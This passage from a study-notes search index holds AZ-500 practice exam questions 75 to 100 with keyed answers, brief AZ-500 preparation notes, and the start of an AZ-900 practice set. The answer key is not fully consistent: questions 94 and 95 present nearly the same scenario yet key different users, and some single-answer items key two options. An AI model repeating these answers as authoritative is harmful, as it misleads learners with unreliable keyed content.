try to invite a user from a blocked domain, you cannot. Security defaults and PIM do not affect guest invitation privileges. By default, the Allow invitations to be sent to any domain (most inclusive) setting is enabled. In this case, you can invite B2B users from any organization.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-75","title":"Question 75","text":"<p>Your company has an Azure Active Directory (Azure AD) tenant named whizlab.com. The company wants to deploy a service named \u201cGetcloudskillsserver\u201d that would run on a virtual machine running Windows Server 2016. The service needs to authenticate to the tenant and access Microsoft Graph to read the directory data. You need to delegate the minimum required permissions for the service. Which of the following steps would you perform in Azure? Choose 3 answers from the options below.</p> <ul> <li> Add an app registration.</li> <li> Grant Application Permissions.</li> <li> Add application permission.</li> <li> Configure an Azure AD Application Proxy.</li> <li> Add delegated permission.</li> </ul> See response <p>Add an app registration.  (Correct) Grant Application Permissions. (Correct) Add application permission. (Correct) Configure an Azure AD Application Proxy. (Incorrect) Add delegated permission.  (Incorrect) First, you need to add an application registration. When it comes to the types of permissions, you have to use Application permissions for services. And then, finally, you grant the required permissions.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-76","title":"Question 76","text":"<p>In order to get diagnostics from an Azure virtual machine you own, what is the first step to doing that?</p> <ul> <li> A diagnostics agent needs to be installed on the VM</li> <li> You need to create a storage account to store it</li> <li> You need to grant RBAC\u00a0permissions to the user requesting diagnostics</li> </ul> See response <p>You need to create a storage account to store it</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-77","title":"Question 77","text":"<p>Being the network engineer at your company, you need to ensure that communications with Azure Storage pass through the Service Endpoint. How would you ensure it?</p> <ul> <li> By adding an Inbound rule to allow access to the storage</li> <li> By adding one Inbound rule and one Outbound rule</li> <li> By adding an Outbound rule to allow access to the storage</li> <li> You don't need to make a specific configuration or add any rule, it is automatically configured.</li> </ul> See response <p>By adding an Outbound rule to allow access to the storage. Inbound/outbound network security group rules can be created to deny traffic from/to the Internet and allow traffic from/to AzureCloud or other available service tags of particular Azure services.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-78","title":"Question 78","text":"<p>You need to recommend a solution for encrypting data at rest and in transit for your company's database. Which of the following would you recommend?</p> <ul> <li> Azure storage encryption</li> <li> Transparent Data Encryption</li> <li> Always Encrypted</li> <li> SSL certificates</li> </ul> See response <p>Always Encrypted.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-79","title":"Question 79","text":"<p>A company wants to synchronize its on-premises Active Directory with its Azure AD tenant. They want to set up a solution that would minimize the need for additional hardware deployment. They also want to ensure that they can keep their current login restrictions. It includes logon hours for their current Active Directory users. Which authentication method should they implement?</p> <ul> <li> Azure AD Connect and Pass-through authentication</li> <li> Federated identity using Azure Directory Federation Services</li> <li> Azure AD Connect and Password hash synchronization</li> <li> Azure AD Connect and Federated authentication</li> </ul> See response <p>Azure AD Connect and Pass-through authentication. Since we need to minimize additional hardware deployments, we can use Azure AD Connect to synchronize Active Directory users with Azure AD. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-80","title":"Question 80","text":"<p>You must specify whether the following statement is TRUE or FALSE: You are an administrator at getcloudskills.com and responsible for managing user accounts on Azure Active Directory. In order to leverage Azure administrative units, do you need an Azure Active Directory Premium License for each Administrative Unit member?</p> <ul> <li> True</li> <li> False</li> </ul> See response <p>False. To manage/use administrative units you need an Azure Active Directory premium license only for each Administrative Unit admin and you can use a free license for unit members.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-81","title":"Question 81","text":"<p>A development team has published an application onto an Azure Web App service. They want to enable Azure AD authentication for the web application. They have to perform an application registration in Azure AD. Which of the following are required when you configure the App service for Azure AD authentication? Choose two answers from the options given below.</p> <ul> <li> Client ID</li> <li> Logout URL</li> <li> Subscription ID</li> <li> Tenant ID</li> </ul> See response <p>Client ID and Tenant ID</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-82","title":"Question 82","text":"<p>You decide to use Azure Front Door for defining, managing, and monitoring the global routing for your web traffic and optimizing end-user reliability and performance via quick global failover. From the below-given list, choose the features that is not supported by Azure Front Door.</p> <ul> <li> Redirect HTTPS traffic to HTTP using URL redirect</li> <li> Web Application Firewall</li> <li> URL path-based routing</li> </ul> See response <p>Redirect HTTPS traffic to HTTP using URL redirect</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-83","title":"Question 83","text":"<p>If no rules other than the default NSG rules are in place, are VMs on SubnetA and SubnetB be able to connect to the Internet?</p> <ul> <li> Yes</li> <li> No</li> </ul> See response <p>Yes. The Outbound rules contain a Rule with the name \u201cAllowInternetOutBound\u201d. This would allow all Outbound traffic to the Internet.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-84","title":"Question 84","text":"<p>Your company has a set of Azure SQL databases hosted on a logical server. They want to enable SQL auditing for the database. Which of the following can be used to store the audit logs? Choose 3 answers from the options given below.</p> <ul> <li> Azure Log Analytics    </li> <li> Azure SQL database</li> <li> Azure Event Hubs</li> <li> Azure Storage accounts</li> <li> Azure SQL data warehouse</li> </ul> See response <p>Azure Log Analytics, Azure Event Hubs and  Azure Storage accounts</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-85","title":"Question 85","text":"<p>Your organization is looking to increase its security posture. Which of the following would you implement to reduce the reliance on passwords and increase account security?</p> <ul> <li> Entra ID B2C</li> <li> Multi-factor Authentication (MFA)    </li> <li> Passwordless Authentication</li> <li> Entra ID Directory Roles</li> </ul> See response <p>Multi-factor Authentication (MFA) and  Passwordless Authentication.  Multi-factor Authentication (MFA) enhances security by requiring two or more verification methods. Passwordless authentication allows users to sign in without a password, instead using methods like the Microsoft Authenticator app. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-86","title":"Question 86","text":"<p>Which of the following is designed to ban certain passwords from being used, ensuring users avoid easily guessable and vulnerable passwords?</p> <ul> <li> Entra ID Identity Protection</li> <li> Entra ID Password Protection</li> <li> Entra ID MFA</li> <li> Entra ID B2B</li> </ul> See response <p>Entra ID Password Protection. Entra ID Password Protection helps you establish comprehensive defense against weak passwords in your environment. It bans certain passwords and sets lockout settings to prevent malicious attempts. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-87","title":"Question 87","text":"<p>You're setting up an application to use Microsoft Entra ID for authentication. Which of the following are essential components you would need to create or configure in Microsoft Entra ID?</p> <ul> <li> Application Registration</li> <li> OAuth token grant</li> <li> Azure Policy</li> </ul> See response <p>Application Registration and  OAuth token grant. When you register an app with Microsoft Entra ID, you're creating an identity configuration for the app that allows it to integrate with the Entra ID identity service. A service principal is an identity created for use with applications, hosted services, and automated tools to access Azure resources. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-88","title":"Question 88","text":"<p>You need to restrict access to your Azure Storage account such that it can only be accessed from a specific subnet within your Azure Virtual Network. Which feature should you utilize?</p> <ul> <li> Private Link services</li> <li> Virtual Network Service Endpoints</li> <li> Azure Functions</li> <li> Azure SQL Managed Instance</li> </ul> See response <p>Virtual Network Service Endpoints. Virtual Network Service Endpoints extend your virtual network private address space and the identity of your VNet to the Azure services, over a direct connection. Endpoints allow you to secure your critical Azure service resources to only your virtual networks.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-89","title":"Question 89","text":"<p>Which of the following Azure services offer built-in Distributed Denial of Service (DDoS) protection to secure your applications?</p> <ul> <li> Azure Firewall</li> <li> Azure Application Gateway</li> <li> Azure DDoS Protection Standard</li> <li> Azure Front Door</li> </ul> See response <p>Azure Application Gateway, Azure DDoS Protection Standard and  Azure Front Door.  Azure Application Gateway offers DDoS protection as part of its WAF (Web Application Firewall) feature. c. Azure DDoS Protection Standard provides advanced DDoS mitigation capabilities. Azure Front Door provides both DDoS protection and Web Application Firewall for its global HTTP/HTTPS endpoints.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-90","title":"Question 90","text":"<p>You have been assigned to enhance the security and compliance of your organization's Azure SQL Database. Which of the following measures can you adopt to encrypt data and audit database operations?</p> <ul> <li> Transparent Database Encryption (TDE)</li> <li> Azure SQL Database Always Encrypted</li> <li> Azure Blob Soft Delete</li> <li> Enable database auditing</li> </ul> See response <p>Transparent Database Encryption (TDE) and  Enable database auditing. Transparent Database Encryption (TDE) encrypts SQL Server, Azure SQL Database, and Azure Synapse Analytics data files. Database auditing tracks database events and writes them to an audit log in your Azure storage account. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-91","title":"Question 91","text":"<p>You need to centralize the management of security configurations for multiple Azure subscriptions. Which Azure service should you utilize to ensure consistent application of configurations?</p> <ul> <li> Entra ID  </li> <li> Azure Key Vault</li> <li> Azure Blueprint</li> <li> Azure Landing Zone</li> </ul> See response <p>Azure Blueprint. Azure Blueprint enables organizations to define a repeatable set of Azure resources that adheres to specific requirements and standards. It allows consistent application of configurations across multiple subscriptions. </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-92","title":"Question 92","text":"<p>You are an Azure security specialist who has been tasked with setting up and maintaining the security monitoring within the organization. Which of the following tasks can be accomplished with Microsoft Sentinel?</p> <ul> <li> Monitor security events using Azure Monitor Logs</li> <li> Automate response to specific security threats</li> <li> Customize analytics rules to identify potential threats</li> <li> Deploy virtual machines in Azure</li> <li> Evaluate and manage generated alerts</li> </ul> See response <p>Monitor security events using Azure Monitor Logs, Automate response to specific security threats, Customize analytics rules to identify potential threats and Evaluate and manage generated alerts. a. Microsoft Sentinel uses Azure Monitor Logs for security events, enabling users to monitor these events. b. Microsoft Sentinel offers automation features to respond to detected security threats. c. One of the features of Microsoft Sentinel is the ability to customize analytics rules, helping in the detection of potential threats. d. Deploying virtual machines is a task within Azure and isn't specifically a function of Microsoft Sentinel. e. Microsoft Sentinel generates alerts based on its analytics, and users can evaluate and manage these alerts within the platform.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-93","title":"Question 93","text":"<p>You have a hybrid configuration of Azure Active Directory (Azure AD). You have an Azure HDInsight cluster on a virtual network. You plan to allow users to authenticate to the cluster by using their on-premises Active Directory credentials. You need to configure the environment to support the planned authentication. Solution: You deploy the On-premises data gateway to the on-premises network. Does this meet the goal?</p> <ul> <li> Yes</li> <li> No</li> </ul> See response <p>No.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-94","title":"Question 94","text":"<p>Your company has an Azure subscription name Subscription1 that contains the users shown in the following table:</p> Name Role User1 Global Administrator User2 Billing Administrator User3 Owner User4 Account Admin <p>The company is sold to a new owner. The company needs to transfer ownership of Suscription1. Which user can transfer the ownership and which tool should the user use? To answer, select the appropriate options in the answer area. NOTE: Each correct selection is worth one point.</p> <p>Select user:</p> <ul> <li> User1</li> <li> User2</li> <li> User3</li> <li> User4</li> </ul> <p>Select tool:</p> <ul> <li> Azure Account Center</li> <li> Azure Cloud Shell</li> <li> Azure PowerShell</li> <li> Azure Security Center</li> </ul> See response <p>User2. Azure Account Center.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-95","title":"Question 95","text":"<p>Your company has an Azure subscription name Subscription1. Subscription1 is associated with the Azure Active Directory tenant that includes the users shown in the following table:</p> Name Role User1 Global Administrator User2 Billing Administrator User3 Owner User4 Account Admin <p>The company is sold to a new owner. The company needs to transfer ownership of Suscription1. Which user can transfer the ownership and which tool should the user use? To answer, select the appropriate options in the answer area. NOTE: Each correct selection is worth one point.</p> <p>Select user:</p> <ul> <li> User1</li> <li> User2</li> <li> User3</li> <li> User4</li> </ul> <p>Select tool:</p> <ul> <li> Azure Account Center</li> <li> Azure Cloud Shell</li> <li> Azure PowerShell</li> <li> Azure Security Center</li> </ul> See response <p>User1. Azure Account Center.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-96","title":"Question 96","text":"<p>The CIS Microsoft Azure Foundations Security Benchmark provides several recommended best practices related to identify and access management. Each of the following is a best practice except for this one?</p> <ul> <li> Avoid unnecessary guest user accounts in Azure Active Directory.</li> <li> Enable Azure Multi-Factor Authentication (MFAA).</li> <li> Establish intervals for reviewing user authentication methods.</li> <li> Enable Self-Service Group Management.</li> </ul> See response <p>Enable Self-Service Group Management.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-97","title":"Question 97","text":"<p>You have an Azure Active Directory (Azure AD) tenant that contains the users shown in the following table.</p> Name Member of a group Multi-factor authentication (MFA) status User1 Group1, Group2 Enabled User2 Group1 Disabled <p>You create and enforce an Azure AD Identity Protection sign-in risk policy that has the following settings:</p> <ul> <li>Assignments: Include Group 1, exclude Group2</li> <li>Conditions: Sign-in risk level: Low and above</li> <li>Access:  Allow access, Require multi-factor authentication.</li> </ul> <p>You need to identify what occurs when the users sign in to Azure AD. What should you identify for each user? To answer, select the apropriate options in the answer area. NOTE: Each correct selection is worth one point.</p> <p>When User1 signs in from an anonymous IP address, the user will:</p> <ul> <li> Be blocked.</li> <li> Be prompted for MFA.</li> <li> Sign in by using a username and password only.</li> </ul> <p>When User2 signs in from an unfamiliar location, the user will:</p> <ul> <li> Be blocked.</li> <li> Be prompted for MFA.</li> <li> Sign in by using a username and password only.</li> </ul> See response <p>User1 will  be prompted for MFA. User2 will be blocked</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-98","title":"Question 98","text":"<p>You have an Azure subscription that contains the virtual machines shown in the following table</p> Name Location Virtual network name VM1 East US VNet1 VM2 West US VNet2 VM3 East US VNet1 VM4 West US VNet3 <p>All the virtual networks are peered. You deploy Azure Bastion to VNet2. Which virtual machines can be protected by the bastion host?</p> <ul> <li> VM1, VM2, VM3, and VM4.</li> <li> VM1, VM2, and VM3 only.</li> <li> VM2 and VM4 only.</li> <li> VM2 only.</li> </ul> See response <p>VM1, VM2, VM3, and VM4.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-99","title":"Question 99","text":"<p>You have an Azure subscription that contains the Azure virtual machines shown in the following table</p> Name Operating System VM1 Windows 10 VM2 Windows Server 2016 VM3 Windows Server 2019 VM4 Ubuntu Server 18.04 LTS <p>You create an MDM Security Baseline profile named Profile1. You need to identify to which virtual machines Profile1 can be applied. Which virtual machines should you identify?</p> <ul> <li> VM1, VM2, VM3, and VM4.</li> <li> VM1, VM2, and VM3 only.</li> <li> VM1 and VM3 only.</li> <li> VM1 only.</li> </ul> See response <p>VM1 only.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-100","title":"Question 100","text":"<p>You have an Azure subscription named Sub1. You create a virtual network that contains one subnet. On the subnet, you provision the virtual machines shown in the following table.</p> Name Network Interface Application security group assignment IP address VM1 NIC1 Appgroup12 10.0.0.10 VM2 NIC2 Appgroup12 10.0.0.11 VM3 NIC3 Appgroup3 10.0.0.100 VM4 NIC4 Appgroup4 10.0.0.200 <p>Currently, you have not provisioned any network security group (NSGs). You need to implement network security to meet the following requirements:</p> <ul> <li>Allow traffic to VM4 from VM3 only.</li> <li>Allow traffic from the Internet to VM1 and VM2.</li> <li>Minimize the number of NSGs and network security rules.</li> </ul> <p>How many NSGs and network security rules should you create? To answer, select the appropriate options in the answer area. NOTE: Each correct selection is worth one point.</p> <p>NSGs:</p> <ul> <li> 1</li> <li> 2</li> <li> 3</li> <li> 4</li> </ul> <p>**Network security rules: **</p> <ul> <li> 1</li> <li> 2</li> <li> 3</li> <li> 4</li> </ul> See response <p>NSGs: 2. Network security rules: 3.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-keep-learning/","title":"AZ-500 Microsoft Azure Security Technologies Certificate - keep learning","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-keep-learning/#az-500-microsoft-azure-security-technologies-certificate-keep-learning","title":"AZ-500 Microsoft Azure Security Technologies Certificate: keep learning","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p> <p>In addition to completing the course work in the AZ-500 learning path, you should also be sure to read the following reference articles from Microsoft:</p> <ul> <li>Manage Azure Active Directory groups and group membership</li> <li>Configure Microsoft Entra Verified ID verifier</li> <li>Block legacy authentication with Azure AD with Conditional Access</li> <li>Microsoft Entra Permissions Management</li> <li>What are access reviews?</li> <li>Register an app with Azure Active Directory</li> <li>Application and service principal objects in Azure Active Directory</li> <li>Virtual network traffic routing</li> <li>Azure SQL Database and Azure Synapse IP firewall rules</li> <li>Networking considerations for App Service Environment</li> <li>Create a virtual network for Azure SQL Managed Instance</li> <li>Add and manage TLS/SSL certificates in Azure App Service</li> <li>Observability in Azure Container Apps</li> <li>Choose how to authorize access to blob data in the Azure portal</li> <li>Authorize access to tables using Azure Active Directory</li> <li>Choose how to authorize access to queue data in the Azure portal</li> <li>Configure immutability policies for blob versions</li> <li>Bring your own key details for Azure Information Protection</li> <li>Enable infrastructure encryption for double encryption of data</li> <li>Define and assign a blueprint in the portal</li> <li>What is an Azure landing zone?</li> <li>Dedicated HSM FAQ</li> <li>Improve your regulatory compliance</li> <li>Customize the set of standards in your regulatory compliance dashboard</li> <li>Create custom Azure security initiatives and policies</li> <li>Plan your Defender for Servers deployment</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-preparation/","title":"AZ-500 Azure Security Engineer: Notes on the certification","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p> <p>These are some of the requirements for facing the az-500 highlighted by some experts:</p> <ul> <li>Have previously taken the Azure Administrator: AZ-103/104 course.</li> <li>A minimum of 1 year experience with Azure.</li> <li>Understand concepts of virtual machines, resource groups and Azure AD.</li> </ul> <p>Since I only had two vouchers for azure certifications in 2023 and I had already spent one on the AZ-900, and I  focused myself on the AZ-500, but first I completed the AZ-104 trainings. These are my notes for this AZ-104 not-certificated learning.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-preparation/#differences-between-the-az-500-and-the-sc-900-certification","title":"Differences between the AZ-500 and the SC-900 certification","text":"<p>The Exam AZ-500: Microsoft Azure Security Technologies is focused on Azure Security Engineer implements, manages, and monitors security for resources in Azure, multi-cloud, and hybrid environments as part of an end-to-end infrastructure. This Certification contains security components and configurations to protect identity &amp; access, data, applications, and networks.</p> <p>Regarding the Exam SC-900: Microsoft Security, Compliance, and Identity Fundamentals is targeted to those looking to familiarize themselves with the fundamentals of security, compliance, and identity (SCI) across cloud-based and related Microsoft services. This is a broad audience that may include business stakeholders, new or existing IT professionals, or students who have an interest in Microsoft security, compliance, and identity solutions.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-900-exams/","title":"Exams - Practice the AZ-900","text":"<p>The AZ-900: Notes to get through the Azure Fundamentals Certificate  and these Practice exams are derived from different sources. </p> <ul> <li>Notes taken in: September 2023.</li> <li>Certification accomplish at: September 23th, 2023.</li> <li>Practice tests: Practice tests from different sources.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#microsoft-platform","title":"Microsoft platform","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#practice-assessment-1","title":"Practice assessment 1","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-1-of-50","title":"Question 1 of 50","text":"<p>Why is cloud computing often less expensive than on-premises datacenters? Each correct answer presents a complete solution.</p> <ul> <li>You are only billed for what you use.</li> </ul> <p>Renting compute and storage services and being billed for only what you use often lowers operating expenses. Depending on the service and the type of network bandwidth, charges can be incurred. Cloud service offerings often provide functionality that can be difficult or cost-prohibitive to deploy on-premises, especially for smaller organizations. Major cloud providers offer services around the world. Making it easy and relatively inexpensive to deploy services close to where your users reside. Describe cloud computing - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-2-of-50","title":"Question 2 of 50","text":"<p>Select the answer that correctly completes the sentence. (------Your Answer Here -------)\u00a0refers to upfront costs incurred one time, such as hardware purchases.</p> <ul> <li>Capital expenditures</li> </ul> <p>Capital expenditures are one-time expenses that can be deducted over time. Operational expenditures are billed as you use services and a do not have upfront costs.</p> <p>Describe cloud computing - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-3-of-50","title":"Question 3 of 50","text":"<p>Which cloud deployment model are you using if you have servers physically located at your organization\u2019s on-site datacenter, and you migrate a few of the servers to the cloud?</p> <ul> <li>hybrid cloud</li> </ul> <p>A hybrid cloud is a computing environment that combines a public cloud and a private cloud by allowing data and applications to be shared between them.</p> <p>Describe cloud computing - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-4-of-50","title":"Question 4 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>Increasing compute capacity for an app by adding RAM or CPUs to a virtual machine is called\u00a0(------Your Answer Here -------).</p> <ul> <li>vertical scaling</li> </ul> <p>You scale vertically to increase compute capacity by adding RAM or CPUs to a virtual machine. Scaling horizontally increases compute capacity by adding instances of resources, such as adding virtual machines to the configuration. Disaster recovery keeps data and other assets safe in the event of a disaster. High availability minimizes downtime when things go wrong. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-5-of-50","title":"Question 5 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>Deploying and configuring cloud-based resources quickly as business requirements change is called\u00a0(------Your Answer Here -------).</p> <ul> <li>agility</li> </ul> <p>Agility means that you can deploy and configure cloud-based resources quickly as app requirements change. Scalability means that you can add RAM, CPU, or entire virtual machines to a configuration. Elasticity means that you can configure cloud-based apps to take advantage of autoscaling, so apps always have the resources they need. High availability means that cloud-based apps can provide a continuous user experience with no apparent downtime, even when things go wrong. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-6-of-50","title":"Question 6 of 50","text":"<p>What are cloud-based backup services, data replication, and geo-distribution features of?</p> <ul> <li>a disaster recovery plan</li> </ul> <p>Disaster recovery uses services, such as cloud-based backup, data replication, and geo-distribution, to keep data and code safe in the event of a disaster. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-7-of-50","title":"Question 7 of 50","text":"<p>What is high availability in a public cloud environment dependent on?</p> <ul> <li>the service-level agreement (SLA) that you choose</li> </ul> <p>Different services have different SLAs. Sometimes different tiers of the same service will offer different SLAs, which can increase or decrease the promised availability. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-8-of-50","title":"Question 8 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>An example of\u00a0(------Your Answer Here -------)\u00a0is automatically scaling an application to ensure that the application has the resources needed to meet customer demands.</p> <ul> <li>elasticity</li> </ul> <p>Elasticity refers to the ability to scale resources as needed, such as during business hours, to ensure that an application can keep up with demand, and then reducing the available resources during off-peak hours. Agility refers to the ability to deploy new applications and services quickly. High availability refers to the ability to ensure that a service or application remains available in the event of a failure. Geo-distribution makes a service or application available in multiple geographic locations that are typically close to your users. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-9-of-50","title":"Question 9 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>Increasing the capacity of an application by adding additional virtual machine is called\u00a0(------Your Answer Here -------).</p> <ul> <li>horizontal scaling</li> </ul> <p>Scaling horizontally increases compute capacity by adding instances of resources, such as adding virtual machines to the configuration. You scale vertically to increase compute capacity by adding RAM or CPUs to a virtual machine. Agility refers to the ability to deploy new applications and services quickly. High availability minimizes downtime when things go wrong. Describe the benefits of using cloud services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-10-of-50","title":"Question 10 of 50","text":"<p>In a platform as a service (PaaS) model, which two components are the responsibility of the cloud service provider? Each correct answer presents a complete solution.</p> <ul> <li>operating system</li> <li>physical network</li> </ul> <p>In PaaS, the cloud provider is responsible for the operating system, physical datacenter, physical hosts, and physical network. In PaaS, the customer is responsible for accounts and identities.  Describe cloud service types - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-11-of-50","title":"Question 11 of 50","text":"<p>Which type of cloud service model is typically licensed through a monthly or annual subscription?</p> <ul> <li>software as a service (SaaS)</li> </ul> <p>SaaS is software that is centrally hosted and managed for you and your users or customers. Usually, one version of the application is used for all customers, and it is licensed through a monthly or annual subscription. PaaS and IaaS use a consumption-based model, so you only pay for what you use. Describe cloud service types - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-12-of-50","title":"Question 12 of 50","text":"<p>In which cloud service model is the customer responsible for managing the operating system?</p> <ul> <li>Infrastructure as a service (IaaS)</li> </ul> <p>IaaS consists of virtual machines and networking provided by the cloud provider. The customer is responsible for the OS and applications. The cloud provider is responsible for the OS in PaaS and SaaS. Describe cloud service types - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-13-of-50","title":"Question 13 of 50","text":"<p>What is the customer responsible for in a software as a service (SaaS) model?</p> <ul> <li>data and access</li> </ul> <p>SaaS allows you to pay to use an existing application on hardware managed by a third party. You supply data and configure access. Customers are only responsible for storage in a private cloud. Customers are responsible for virtual machines and runtime in IaaS and the private cloud. Describe cloud service types - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-14-of-50","title":"Question 14 of 50","text":"<p>What uses the infrastructure as a service (IaaS) cloud service model?</p> <ul> <li>Azure virtual machines</li> </ul> <p>Azure Virtual Machines is an IaaS offering. The customer is responsible for the configuration of the virtual machine as well as all operating system configurations. Azure App Services and Azure Cosmos DB are PaaS offerings. Microsoft Office 365 is a SaaS offering. Describe cloud service types - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-15-of-50","title":"Question 15 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>(------Your Answer Here -------)\u00a0is the logical container used to combine and organize Azure resources.</p> <ul> <li>a resource group</li> </ul> <p>Resources are combined into resource groups, which act as a logical container into which Azure resources like web apps, databases, and storage accounts, are deployed and managed. Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-16-of-50","title":"Question 16 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>In a region pair, a region is paired with another region in the same\u00a0(------Your Answer Here -------).</p> <ul> <li>geography</li> </ul> <p>Each Azure region is always paired with another region within the same geography, such as US, Europe, or Asia, at least 300 miles away. Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-17-of-50","title":"Question 17 of 50","text":"<p>What is an Azure Storage account named storage001 an example of?</p> <ul> <li>a resource</li> </ul> <p>A resource is a manageable item that is available through Azure. Virtual machines, storage accounts, web apps, databases, and virtual networks are examples of resources. Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-18-of-50","title":"Question 18 of 50","text":"<p>For which resource does Azure generate separate billing reports and invoices by default?</p> <ul> 